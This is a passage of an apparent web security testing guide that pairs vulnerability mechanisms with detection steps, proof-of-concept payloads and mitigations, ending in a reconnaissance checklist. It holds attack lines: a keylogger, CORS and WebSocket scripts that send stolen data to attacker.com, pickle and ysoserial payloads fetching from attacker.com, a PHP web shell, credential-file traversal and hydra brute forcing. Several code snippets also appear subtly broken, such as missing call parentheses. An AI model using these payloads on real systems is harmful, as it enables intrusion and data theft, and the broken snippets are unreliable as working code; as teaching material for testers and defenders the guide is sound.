<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>
```

</details>

**Mitigation:**
- Output-encode all user data before inserting into HTML context (`&`, `<`, `>`, `"`, `'` → HTML entities)
- Use context-appropriate encoding: HTML encoding for HTML context, JavaScript encoding for JS context, URL encoding for URL context
- Implement a strict CSP: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'`
- Use DOMPurify for any case where HTML must be rendered from user input
- Set `HttpOnly` on session cookies to prevent theft even if XSS fires

**Tools:** XSStrike, Dalfox, Burp Suite DOM Invader, XSS Hunter

[↑ Back to Top](#table-of-contents)

---

## 5. Authentication & Session Vulnerabilities {#auth-session}

---

### Broken Authentication — 🟠 HIGH

**Mechanism:** No rate limiting on login → credential stuffing at scale. Weak password policy → passwords appear in breach databases. No MFA → single factor is the only barrier.

**Detection checklist:**
- [ ] Send 100 login requests in 60 seconds — is there rate limiting or CAPTCHA?
- [ ] Does the app accept passwords shorter than 8 characters?
- [ ] Is the same session token used before and after login?
- [ ] Are credentials visible in URL parameters or server logs?

**PoC — Credential stuffing simulation (authorized test only):**
```bash
hydra -L userlist.txt -P passlist.txt target.com http-post-form \
 "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Mitigation:** Rate limit login to ~10 attempts per minute per IP/account. Implement progressive delays. Require MFA for all privileged accounts. Check new passwords against HaveIBeenPwned API.

---

### Session Fixation — 🟠 HIGH

**Mechanism:** The server issues a session token before authentication and does not replace it after successful login. An attacker who knows the pre-login token (e.g., obtained from an HTTP link) retains a valid authenticated session.

**Detection:** Note the session token before login; log in; check if the token changed. If it did not, fixation is present.

**Mitigation:** Always call `session_regenerate_id(true)` (PHP) or equivalent immediately after successful authentication.

---

### JWT Vulnerabilities — 🔴 CRITICAL

**Mechanism:** JSON Web Tokens encode claims signed by the server. Several implementation flaws allow attackers to forge tokens.

**`alg:none` attack:**
```python
# Decode the JWT, change alg to "none", remove signature
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode).decode.rstrip('=')
payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode).decode.rstrip('=')
forged_token = f"{header}.{payload}."
```

**Weak secret brute-force:**
```bash
# hashcat attack on HS256 JWT
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
```

**Algorithm confusion (RS256 → HS256):**
The server uses RS256 (asymmetric). The attacker changes `alg` to `HS256` and signs the token with the server's **public key** (which is often publicly available). A vulnerable server verifies the HS256 signature using the public key as the HMAC secret — and it passes.

**`kid` header injection:**
```json
{"alg":"HS256","kid":"../../dev/null"}
```
If `kid` is used to look up a signing key from the filesystem, path traversal can make the server use `/dev/null` (empty string) as the key — trivially forgeable.

**Detection checklist:**
- [ ] Decode the JWT (jwt.io) — is `alg` set to `none`?
- [ ] Is the secret weak (dictionary word)?
- [ ] Does changing `alg` from RS256 to HS256 and re-signing with the public key succeed?
- [ ] Is the `kid` parameter used? Does it accept path traversal or SQL injection?

**Mitigation:**
- Reject tokens with `alg:none` explicitly
- Use strong, randomly generated secrets (256-bit minimum for HS256)
- Explicitly specify the expected algorithm when verifying; never trust the algorithm from the token header
- Validate and sanitize the `kid` header; use a lookup table, not filesystem paths

**Tools:** jwt_tool, hashcat, jwt.io

---

### OAuth 2.0 Flaws — 🟠 HIGH

**Open redirect in redirect_uri:**
```
https://auth.provider.com/oauth/authorize?
 client_id=app&
 redirect_uri=https://attacker.com& ← authorization code sent here
 response_type=code&
 state=xyz
```
If the provider doesn't strictly validate `redirect_uri`, the authorization code goes to the attacker.

**State parameter bypass (CSRF on OAuth):**
If `state` is missing or not validated, an attacker can initiate an OAuth flow and trick the victim's browser into completing it — linking the attacker's identity provider account to the victim's application account.

**Token leakage via Referer:**
If the access token is in the URL fragment and the page loads external resources, the token appears in the `Referer` header of those requests.

**Mitigation:**
- Strictly validate `redirect_uri` against a pre-registered allowlist (exact match, not prefix match)
- Require and validate the `state` parameter as a CSRF token
- Use `response_type=code` (authorization code flow) rather than implicit flow; never put tokens in URL fragments for sensitive applications
- Use PKCE (Proof Key for Code Exchange) for all public clients

---

### SAML Vulnerabilities — 🟠 HIGH

**XML Signature Wrapping (XSW):**
SAML assertions are XML-signed. The signature covers a specific element. The attacker wraps the signed element inside a new element and adds a malicious assertion at the same level. The signature verifies the original element; the application processes the malicious one.

**Comment injection:**
```xml
<NameID>admin<!----@attacker.com</NameID>
```
Some parsers strip XML comments, making this parse as `admin`; others don't, making it `admin@attacker.com`. If the parser and the authentication logic use different parsers, the attacker authenticates as `admin`.

**Mitigation:** Use a well-tested SAML library; verify signatures strictly before processing any assertion content; normalize XML before parsing.

---

### Multi-Factor Authentication Bypass — 🟡 MEDIUM

**OTP brute force:** If no rate limiting exists on OTP submission, a 6-digit TOTP code (1,000,000 possibilities) can be brute-forced within the 30-second window — though this requires very high request rates.

**Response manipulation:** Intercept the failed MFA response (`{"mfa_required": true}`) and modify it to `{"mfa_required": false}` — if the server trusts this client-side signal, MFA is bypassed.

**Backup code exposure:** Backup codes stored in plaintext, accessible via IDOR, or sent via insecure channel.

**Mitigation:** Rate limit OTP attempts to 5 per minute. Validate MFA status server-side on every privileged action, not just at login. Store backup codes as hashed values.

---

### Password Reset Flaws — 🟠 HIGH

**Predictable tokens:**
```python
# Weak token generation (timestamp-based)
import time, hashlib
token = hashlib.md5(str(time.time).encode).hexdigest
# Attacker requests reset, observes time, brute-forces nearby timestamps
```

**Host header injection in reset links:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com ← injected

# Server generates: https://attacker.com/reset?token=abc123
# Email sent to victim contains attacker's domain
```

**Token reuse:** Reset tokens that remain valid after use or don't expire.

**Mitigation:**
- Generate reset tokens using a cryptographically secure random number generator (at least 128 bits of entropy)
- Invalidate tokens immediately after use and after 15–60 minutes of non-use
- Validate the `Host` header against a configured allowlist before constructing reset URLs
- Bind tokens to the requesting IP address and user agent

[↑ Back to Top](#table-of-contents)

---

## 6. Access Control & Authorization Vulnerabilities {#access-control}

---

### IDOR (Insecure Direct Object Reference) — 🔴 CRITICAL

**Mechanism:** The application uses a user-supplied identifier (integer ID, filename, UUID) to look up an object without verifying the requesting user is authorized to access that specific object.

**Testing approach:**
1. Create two accounts (Account A and Account B)
2. With Account A, find a resource reference: `/api/orders/10042`
3. With Account B's session, request `/api/orders/10042`
4. If you receive Account A's data, IDOR is confirmed

**UUID prediction:** UUIDv1 contains a timestamp and MAC address — predictable. UUIDv4 is random and not predictable. Check which version the app uses.

**Mass assignment IDOR:**
```json
// Request to update profile
PATCH /api/user/profile
{"name": "Alice", "role": "admin"} ← role field not expected but accepted
```

**Mitigation:**
- Authorize every object access server-side: verify the requesting user owns or has permission to access the requested object
- Use indirect references: map internal IDs to random tokens per-session
- Apply object-level authorization in every API endpoint (BOLA per OWASP API Top 10)

---

### Horizontal vs. Vertical Privilege Escalation — 🔴 CRITICAL

**Horizontal escalation:** User A accesses User B's data at the same privilege level (IDOR is the most common mechanism).

**Vertical escalation:** A regular user accesses admin-level functions.

**Vertical escalation detection:**
```bash
# Enumerate admin endpoints as a regular user
ffuf -u https://target.com/FUZZ -w admin-paths.txt \
 -H "Cookie: session=regular_user_token" \
 -mc 200,301,302
```

**Parameter tampering:**
```http
POST /change-role HTTP/1.1
{"user_id": 1337, "role": "admin"} ← sent as regular user
```

**Mitigation:** Implement role-based access control (RBAC) with server-side enforcement. Every function that requires elevated privilege must verify the caller's role, not just the UI.

---

### Path Traversal / Directory Traversal — 🔴 CRITICAL

**Mechanism:** User-supplied filename or path parameter is used to open a file. The attacker inserts `../` sequences to escape the intended directory and access arbitrary files.

**Payloads:**
```
# Basic
../../../../etc/passwd
../../../../etc/shadow
../../../../Windows/System32/drivers/etc/hosts

# URL-encoded
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL-encoded
%252e%252e%252f%252e%252e%252f

# Null byte (legacy PHP)
../../../../etc/passwd%00.jpg

# UNC path (Windows)
\\attacker.com\share\file
```

**Detection:**
```bash
# Test file parameter
curl "https://target.com/download?file=../../../../etc/passwd"
```

**Mitigation:**
- Resolve the canonical path after joining with the base directory; reject any path that does not start with the expected base directory
- Use an allowlist of permitted filenames; never construct file paths from user input
- Run the web server process as a low-privilege user with restricted filesystem access

---

### Local File Inclusion (LFI) and Remote File Inclusion (RFI) — 🔴 CRITICAL

**Mechanism:** PHP (and other languages) include files dynamically based on a parameter. LFI includes local files; RFI includes remote URLs (if `allow_url_include` is enabled in PHP).

**LFI payloads:**
```
# Basic file read
?page=../../../../etc/passwd
?lang=../../../../etc/passwd

# Log poisoning (inject PHP into User-Agent, then include log)
User-Agent: <?php system($_GET['cmd']); ?>
?page=../../../../var/log/apache2/access.log&cmd=id

# /proc/self/environ
?page=../../../../proc/self/environ

# PHP wrappers
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://input (with POST body: <?php system('id'); ?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**RFI payload:**
```
?page=http://attacker.com/shell.txt
```

**Mitigation:** Never use user input in `include`, `require`, or equivalent calls. If dynamic includes are required, use an allowlist mapping parameter values to specific file paths.

---

### CORS Misconfiguration — 🟠 HIGH

**Mechanism:** The server's CORS policy is too permissive, allowing attacker-controlled origins to make credentialed cross-origin requests and read responses.

**Vulnerable configurations:**
```
# Reflects any origin
Access-Control-Allow-Origin: [copied from request Origin header]
Access-Control-Allow-Credentials: true

# Trusts null origin (sandboxed iframes)
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploit PoC:**
```javascript
// Attacker's page (evil.com) — reads victim's data from target.com
fetch('https://target.com/api/user/profile', {
 credentials: 'include'
})
.then(r => r.json)
.then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)));
```

**Detection:**
```bash
curl -H "Origin: https://attacker.com" -I https://target.com/api/data
# Check if Access-Control-Allow-Origin: https://attacker.com is returned
```

**Mitigation:** Explicitly allowlist trusted origins; never reflect the `Origin` header back. Do not combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers block this, but some server configs attempt it). Treat `null` origin as untrusted.

[↑ Back to Top](#table-of-contents)

---

## 7. CSRF & Clickjacking {#csrf-clickjacking}

---

### Cross-Site Request Forgery (CSRF) — 🟠 HIGH

**Mechanism:** The attacker tricks an authenticated user's browser into sending a forged request to the target application. The browser automatically includes the victim's cookies, so the request appears legitimate.

**GET-based CSRF:**
```html
<!-- On attacker's page -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**POST-based CSRF:**
```html
<form action="https://bank.com/transfer" method="POST" id="csrf">
 <input type="hidden" name="to" value="attacker">
 <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit;</script>
```

**JSON CSRF (Content-Type bypass):**
```html
<!-- If server accepts text/plain with JSON body -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
 <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
```

**CSRF token bypass techniques:**
- **Token absence:** Remove the CSRF token parameter entirely — if the server doesn't check for its presence, request succeeds
- **Token fixation:** If the token is tied to the session but not to the specific form/action, reuse a valid token from another form
- **Referrer-based bypass:** If protection relies only on `Referer` header, send request with no `Referer` (via `<meta name="referrer" content="no-referrer">`)

**SameSite bypass:** `SameSite=Lax` still allows GET requests initiated by top-level navigation — a GET-based state-changing action remains vulnerable.

**Detection checklist:**
- [ ] Are state-changing requests protected by a per-request CSRF token?
- [ ] Is the CSRF token validated server-side (not just checked for presence)?
- [ ] Are cookies set with `SameSite=Strict` or `SameSite=Lax`?
- [ ] Does removing the CSRF token cause the request to fail?

**Mitigation:**
- Use synchronizer token pattern: generate a random, per-session CSRF token; include it in every state-changing form; validate server-side
- Set `SameSite=Strict` on session cookies for maximum protection; `Lax` for compatibility
- Verify the `Origin` and `Referer` headers as a secondary check
- Use the Double Submit Cookie pattern as an alternative to server-side token storage

---

### Clickjacking — 🟡 MEDIUM

**Mechanism:** The attacker loads the target site in a transparent iframe overlaid on a decoy page. The victim interacts with the visible decoy but their clicks register on the hidden target.

**Double-click jacking:** The attacker's page requires two clicks; the first click is on a visible button, the second click (while the iframe has been positioned) triggers an action on the target.

**Drag-and-drop jacking:** The victim drags content from what appears to be a text field but is actually dragging data from the target iframe.

**Detection:**
```bash
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
```
If neither `X-Frame-Options` nor `CSP frame-ancestors` is present, the site is frameable.

**Mitigation:**
```http
# Option 1: X-Frame-Options header
X-Frame-Options: DENY

# Option 2: CSP (more flexible, preferred)
Content-Security-Policy: frame-ancestors 'none';

# Allow same-origin framing only
Content-Security-Policy: frame-ancestors 'self';
```

[↑ Back to Top](#table-of-contents)

---

## 8. Server-Side Vulnerabilities {#server-side}

---

### SSRF — Deep Dive — 🔴 CRITICAL

*(See A10 in Section 2 for the basic mechanism. This section covers bypass techniques.)*

**SSRF filter bypass techniques:**

```
# IPv6 representation of 127.0.0.1
http://[::1]/admin
http://[::ffff:127.0.0.1]/admin

# Decimal IP representation
http://2130706433/ (= 127.0.0.1)
http://0x7f000001/ (= 127.0.0.1 in hex)

# DNS rebinding: attacker.com resolves to 127.0.0.1 on second lookup
http://attacker.com/

# URL redirects (if redirects are followed)
http://attacker.com/redirect?to=http://169.254.169.254/

# Alternative loopback addresses
http://127.0.0.0/
http://0.0.0.0/
http://0/

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/ # AWS
http://metadata.google.internal/computeMetadata/v1/ # GCP (requires header)
http://169.254.169.254/metadata/instance # Azure
```

**Blind SSRF detection:**
Use a Burp Collaborator or interactsh payload to detect out-of-band DNS/HTTP interactions:
```
http://your-collaborator-id.burpcollaborator.net/
```

**Mitigation (beyond Section 2):** Enforce allowlists at the network layer (egress firewall rules), not just application layer. Use IMDSv2 on AWS (requires a PUT request with a token — not forgeable via SSRF). Disable `follow_redirects` in the HTTP client.

---

### Deserialization Vulnerabilities — 🔴 CRITICAL

**Mechanism:** The application deserializes objects from untrusted sources. If the classpath contains a "gadget chain" — a sequence of classes whose deserialization triggers method calls leading to RCE — the attacker can achieve code execution by crafting a malicious serialized object.

**Java (ysoserial):**
```bash
# Generate a payload using CommonsCollections gadget chain
java -jar ysoserial.jar CommonsCollections6 "curl https://attacker.com/rce" | base64

# Send as serialized Java object (magic bytes: AC ED 00 05)
```

**PHP object injection:**
```php
// Vulnerable code
$data = unserialize($_COOKIE['data']);

// Malicious serialized object exploiting __destruct or __wakeup
O:8:"UserData":1:{s:4:"file";s:11:"/etc/passwd";}
```

**Python pickle RCE:**
```python
import pickle, os

class Exploit(object):
 def __reduce__(self):
 return (os.system, ('curl https://attacker.com/rce',))

payload = pickle.dumps(Exploit)
# Send payload wherever pickle.loads is called on user input
```

**Detection checklist:**
- [ ] Does the app accept serialized data in cookies, POST bodies, or headers?
- [ ] Are Java objects transmitted (look for `rO0AB` in base64, or `AC ED` in hex)?
- [ ] Does the app use PHP `unserialize` on user input?
- [ ] Are Python pickle files accepted for import/upload?

**Mitigation:**
- Never deserialize data from untrusted sources
- If unavoidable: use JSON instead of native serialization; implement deserialization allowlists (Java serialization filters, `JAVA_SERIALIZATION_FILTER`)
- Run deserialization in a sandboxed environment with no network access
- Use Java Agent-based deserialization protection (SerialKiller, NotSoSerial)

**Tools:** ysoserial, PHPGGC (PHP gadget chain generator), Burp Suite

---

### File Upload Vulnerabilities — 🔴 CRITICAL

**Mechanism:** The application accepts file uploads but fails to validate the file type, content, or storage location — allowing upload of executable files (webshells) that can be triggered via HTTP request.

**Extension bypass techniques:**
```
# Double extension
shell.php.jpg
shell.php%00.jpg (null byte, legacy PHP)
shell.pHp (case variation)
shell.php5
shell.phtml
shell.phar

# MIME type spoofing (change Content-Type header)
Content-Type: image/jpeg (for a PHP file)

# Polyglot file (valid JPEG + PHP code)
# Append PHP code after JPEG magic bytes: FF D8 FF 
```

**ImageMagick exploits (ImageTragick):**
```
# Malicious SVG/MVG file
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/"|curl https://attacker.com/rce|")'
pop graphic-context
```

**Path traversal in filename:**
```
filename="../../../../var/www/html/shell.php"
```

**Detection checklist:**
- [ ] Does the app accept file uploads?
- [ ] Is file type validated only by extension (not by magic bytes/content)?
- [ ] Are uploaded files stored in a web-accessible directory?
- [ ] Is the original filename preserved in the stored path?

**Mitigation:**
- Validate file type by magic bytes (content inspection), not extension or MIME header
- Rename uploaded files to random UUIDs with a safe extension
- Store uploads outside the web root; serve via a download controller that sets `Content-Disposition: attachment`
- Restrict execution permissions on the upload directory
- Use a CDN or object storage for uploads — files never execute on the web server

---

### Business Logic Flaws — 🟡 MEDIUM

**Mechanism:** The application's intended workflow contains assumptions that attackers can violate — not a technical vulnerability but a design flaw in the business rules.

**Common patterns:**

- **Negative price:** Send `quantity=-1` or `price=-10.00` — if the server calculates totals without bounding, the cart total goes negative (credit to attacker)
- **Race condition (TOCTOU):** Two concurrent requests both pass a "sufficient balance" check before either deducts the balance — double-spend
- **Workflow bypass:** Skip step 2 of a 3-step checkout by directly POST-ing to step 3's endpoint
- **Coupon stacking:** Apply the same coupon multiple times by replaying the apply-coupon request before the first application is committed
- **Free upgrade:** Purchase a basic plan, intercept the confirmation request, change `plan_id` to premium

**Race condition testing:**
```python
# Send concurrent requests using Python threading
import threading, requests

def buy:
 requests.post('https://target.com/redeem', 
 data={'code': 'PROMO10'}, 
 cookies={'session': 'victim_session'})

threads = [threading.Thread(target=buy) for _ in range(20)]
[t.start for t in threads]
[t.join for t in threads]
```

**Mitigation:** Validate all business rules server-side at the point of consequence. Use database-level locking (SELECT FOR UPDATE) for operations involving shared state. Implement idempotency keys for sensitive operations.

[↑ Back to Top](#table-of-contents)

---

## 9. Infrastructure & Configuration Vulnerabilities {#infrastructure}

---

### Exposed Sensitive Files — 🟠 HIGH

**Mechanism:** Development artifacts, backup files, and configuration files left in web-accessible directories expose source code, credentials, and internal structure.

**High-value targets:**
```bash
# Git repository exposure
/.git/config
/.git/HEAD
/.git/COMMIT_EDITMSG

# Environment files
/.env
/.env.local
/.env.production

# Backup files
/backup.zip
/backup.tar.gz
/db.sql
/database.sql
/site.bak

# PHP info
/phpinfo.php
/info.php
/test.php

# Editor artifacts
/.DS_Store (reveals directory structure on macOS)
/Thumbs.db
/*.swp (Vim swap files — contain source code)

# Dependency manifests (reveal versions)
/package.json
/composer.json
/requirements.txt
/Gemfile
```

**Git repository reconstruction:**
```bash
# If /.git/ is accessible, reconstruct source code
git-dumper https://target.com/.git/./output-dir
```

**Detection:**
```bash
# Automated scan for common sensitive files
ffuf -u https://target.com/FUZZ -w sensitive-files.txt -mc 200
```

---

### HTTP Security Headers Audit — 🟡 MEDIUM

| Header | Recommended Value | Risk if Missing |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'nonce-{random}'` | XSS, data injection |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME-type confusion attacks |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | SSL stripping, downgrade |
| `Referrer-Policy` | `no-referrer` or `strict-origin-when-cross-origin` | URL/token leakage in Referer |
| `Permissions-Policy` | `geolocation=, camera=, microphone=` | Unwanted browser feature access |
| `Cross-Origin-Opener-Policy` | `same-origin` | Cross-origin window access |
| `Cross-Origin-Resource-Policy` | `same-origin` | Cross-origin data reads |

**Detection:**
```bash
curl -I https://target.com | grep -iE "content-security|x-frame|x-content-type|strict-transport|referrer-policy|permissions-policy"

# Automated header audit
securityheaders.com
```

---

### TLS/SSL Vulnerabilities — 🟠 HIGH

| Vulnerability | Affected Versions | Attack | Detection |
|---|---|---|---|
| BEAST | TLS 1.0 + CBC | Block boundary exploitation | `testssl.sh --beast` |
| POODLE | SSL 3.0 | Padding oracle on CBC | `testssl.sh --poodle` |
| HEARTBLEED | OpenSSL 1.0.1–1.0.1f | Memory read via heartbeat | `nmap -p 443 --script ssl-heartbleed` |
| ROBOT | RSA PKCS#1 v1.5 | Bleichenbacher oracle | `testssl.sh --robot` |
| DROWN | SSLv2 + RSA key reuse | Cross-protocol attack | `testssl.sh --drown` |
| Weak ciphers | Any | Brute force / export crypto | `nmap --script ssl-enum-ciphers` |

**Mitigation:** Disable SSL 3.0 and TLS 1.0/1.1. Disable RC4, DES, 3DES, EXPORT cipher suites. Enable HSTS. Use certificate pinning for mobile clients.

---

### Web Cache Poisoning — 🟠 HIGH

**Mechanism:** The cache stores a poisoned response (containing attacker-controlled content) keyed to a URL that legitimate users will request. The attacker injects content via unkeyed request headers that the cache ignores when building the cache key but the backend includes in the response.

**Common unkeyed headers:**
```http
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

**PoC:**
```bash
# Inject malicious host header — if reflected in response and cached
curl -H "X-Forwarded-Host: attacker.com" https://target.com/
# If response contains: <script src="https://attacker.com/app.js">
# And this response is cached, all subsequent visitors load attacker's script
```

**Mitigation:** Configure the cache to key on all headers that affect the response. Disable caching for responses that reflect user-controlled input. Use `Vary` header to include security-relevant headers in the cache key.

**Tools:** Param Miner (Burp extension), Web Cache Vulnerability Scanner

---

### HTTP Request Smuggling — 🔴 CRITICAL

**Mechanism:** When a front-end proxy and back-end server disagree on where one HTTP request ends and the next begins (due to ambiguous `Content-Length` and `Transfer-Encoding` headers), the attacker can "smuggle" a partial request that gets prepended to the next legitimate user's request.

**CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Impact:** Bypass front-end security controls, hijack other users' requests, cache poisoning, XSS via response queue poisoning.

**Detection:**
```bash
# Burp Suite HTTP Request Smuggler extension (automated detection)
# Manual: send a CL.TE probe and observe timing differences
```

**Mitigation:** Normalize ambiguous requests at the front-end proxy; reject requests with both `Content-Length` and `Transfer-Encoding`. Use HTTP/2 end-to-end (eliminates CL/TE ambiguity). Ensure front-end and back-end agree on request boundary parsing.

[↑ Back to Top](#table-of-contents)

---

## 10. Advanced & Emerging Vulnerabilities {#advanced-emerging}

---

### GraphQL Vulnerabilities — 🟠 HIGH

**Introspection abuse:**
```graphql
# Dump entire schema
{ __schema { types { name fields { name type { name } } } } }
```
Introspection reveals all types, fields, queries, and mutations — a complete attack map. Disable in production.

**Batching attack (brute force bypass):**
```json
[
 {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
 {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
...100 more...
]
```
One HTTP request, 100 login attempts — rate limiting per HTTP request doesn't help.

**DoS via deeply nested queries:**
```graphql
{ user { friends { friends { friends { friends { friends { name } } } } } } }
```
Exponential database query depth — without query depth limiting, this causes resource exhaustion.

**Field suggestion enumeration:**
GraphQL returns "Did you mean X?" suggestions for typos — reveals valid field names even when introspection is disabled.

**Mitigation:** Disable introspection in production. Implement query depth limits (max 5–10 levels). Apply query complexity analysis and cost limits. Rate limit at the operation level, not HTTP request level. Disable field suggestions in production.

**Tools:** InQL (Burp extension), GraphQL Voyager, Clairvoyance (field enumeration without introspection)

---

### Prototype Pollution — 🟠 HIGH

**Mechanism (client-side):** JavaScript's prototype chain means all objects inherit from `Object.prototype`. If an attacker can set `__proto__` properties on a plain object (via merge/clone functions), those properties become available on every object in the application.

**Mechanism (server-side / Node.js):** Same attack, but on the server. If a vulnerable `merge` or `deepClone` function is called with attacker-controlled JSON, the server's `Object.prototype` is polluted — affecting all subsequent object property lookups.

**PoC payload:**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**Impact:** Bypass `if (user.isAdmin)` checks, override configuration values, achieve RCE in some Node.js frameworks (via polluted `shell` or `execArgv` properties).

**Detection:**
```bash
# Test in browser console
Object.prototype.polluted = "yes"
({}).polluted // "yes" confirms pollution
```

**Mitigation:**
- Use `Object.create(null)` for objects used as hash maps
- Freeze `Object.prototype` in Node.js: `Object.freeze(Object.prototype)`
- Use `JSON.parse` with a reviver that rejects `__proto__` and `constructor` keys
- Use lodash 4.17.21+ (patched); audit all deep merge/clone libraries

---

### DOM Clobbering — 🟡 MEDIUM

**Mechanism:** HTML elements with `id` or `name` attributes create properties on the `window` object. If JavaScript references `window.someVar` expecting a configuration object, an attacker who can inject HTML can "clobber" that variable with a DOM element reference.

**Example:**
```html
<!-- Attacker injects (via stored HTML injection, not XSS) -->
<a id="config" href="https://attacker.com/malicious.js"></a>

<!-- Application code -->
<script>
 // config is now the <a> element, not the expected config object
 var scriptSrc = config.scriptSrc; // attacker.com/malicious.js
 var s = document.createElement('script');
 s.src = scriptSrc;
 document.head.appendChild(s);
</script>
```

**Mitigation:** Avoid using `window` properties as configuration objects without explicit initialization. Use DOMPurify (which strips `id` and `name` attributes that could clobber). Initialize configuration variables explicitly before any HTML is parsed.

---

### WebSocket Vulnerabilities — 🟠 HIGH

**Cross-site WebSocket hijacking:** WebSocket connections use the browser's cookie jar but don't enforce same-origin policy by default. An attacker's page can open a WebSocket connection to the target, and the browser sends the victim's cookies.

```javascript
// Attacker's page
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = function(e) {
 fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
```

**Detection:** Check if the WebSocket endpoint validates the `Origin` header.

**Mitigation:** Validate the `Origin` header on WebSocket upgrade requests. Implement a CSRF-style token in the WebSocket handshake URL or first message.

---

### Subdomain Takeover — 🟠 HIGH

**Mechanism:** A DNS record (CNAME) points to a cloud service (GitHub Pages, Heroku, Azure) that has been deprovisioned. The attacker claims the unclaimed service and now controls content served from the subdomain.

**Common dangling CNAME targets:**
- `*.github.io` (GitHub Pages)
- `*.herokuapp.com` (Heroku)
- `*.azurewebsites.net` (Azure)
- `*.s3.amazonaws.com` (AWS )
- `*.cloudfront.net` (CloudFront)

**Detection:**
```bash
# Find subdomains with dangling CNAMEs
subfinder -d target.com | dnsx -cname | grep -E "github|heroku|azure|amazonaws"

# Check if the CNAME target is claimable
dig CNAME staging.target.com
# If it points to unclaimed.github.io and that page 404s, it's claimable
```

**Impact:** Cookie theft (if `domain=.target.com` cookies are sent to the subdomain), phishing, CSP bypass.

**Mitigation:** Audit all DNS records regularly. Remove CNAME records before deprovisioning cloud services. Use automated monitoring (can-i-take-over-xyz database, SubOver tool).

---

### Race Conditions — 🟠 HIGH

**Mechanism:** Two concurrent requests both read a shared state before either writes back — both pass a validation check that only one should pass.

**Classic double-spend:**
```
Time 0ms: Request A reads balance = $100
Time 1ms: Request B reads balance = $100
Time 5ms: Request A deducts $100, writes balance = $0
Time 6ms: Request B deducts $100, writes balance = $0 (should have been -$100)
```

**Exploitation technique — parallel requests:**
```python
import concurrent.futures, requests

session = requests.Session
session.cookies.set('session', 'victim_token')

def redeem:
 return session.post('https://target.com/redeem-coupon', data={'code': 'SAVE50'})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
 futures = [ex.submit(redeem) for _ in range(20)]
 results = [f.result for f in futures]
```

**Mitigation:** Use database-level atomic operations (`UPDATE balance SET amount = amount - 100 WHERE amount >= 100`) rather than read-modify-write cycles. Use row-level locking (`SELECT FOR UPDATE`). Implement idempotency keys.

---

### Supply Chain Attacks — 🔴 CRITICAL

**Dependency confusion:** An attacker publishes a public npm/PyPI package with the same name as an internal private package but a higher version number. Package managers that check public registries first will install the malicious public package instead of the internal one.

**Typosquatting:**
```
# Legitimate packages vs. typosquats
requests → request, requets, requestss
lodash → 1odash, l0dash
```

**Malicious CDN scripts:** If a third-party CDN is compromised or a CDN URL is typosquatted, all sites loading scripts from it are affected.

**Mitigation:**
- Use Subresource Integrity (SRI) for CDN-loaded scripts
- Pin dependency versions with lock files; verify checksums
- Configure package managers to prefer private registries for internal packages
- Audit `package.json` / `requirements.txt` for unexpected packages after each update
- Use tools like Socket.dev or Snyk for supply chain risk analysis

[↑ Back to Top](#table-of-contents)

---

## 11. The Vulnerability Checking Agent — Structured Checklist {#agent-checklist}

This phase-by-phase checklist is designed to be followed sequentially for a complete web application security assessment.

---

### Phase 1: Reconnaissance

**Goal:** Map the complete attack surface before testing anything.

- [ ] **Subdomain enumeration:** `subfinder -d target.com -o subdomains.txt`
- [ ] **DNS resolution:** `dnsx -l subdomains.txt -a -cname -o resolved.txt`
- [ ] **Tech stack fingerprinting:** Wappalyzer (browser extension), `whatweb https://target.com`
- [ ] **Check robots.txt and sitemap.xml:** `curl https://target.com/robots.txt`
- [ ] **Directory enumeration:** `ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt`
- [ ] **Check for exposed sensitive files:** `.git/`, `.env`, `phpinfo.php`, `backup.zip`
- [ ] **Port scanning:** `nmap -sV -p 80,443,8080,8443,8888,3000 target.com`
- [ ] **JavaScript file analysis:** `gau target.com | grep "\.js$"` then review for endpoints/secrets
- [ ] **WAF detection:** `wafw00f https://target.com`

**Google Dorking Checklist:**
```
site:target.com ext:php inurl:?
site:target.com ext:sql | ext:bak | ext:log
site:target.com "index of /"
site:target.com inurl:admin | inurl:login | inurl:dashboard
site:target.com "DB_PASSWORD" | "API_KEY" | "SECRET"
site:target.com filetype:env
site:target.com inurl:".git"
site:target.com inurl:wp-content/uploads
site:target.com "error" | "exception" | "stack trace"
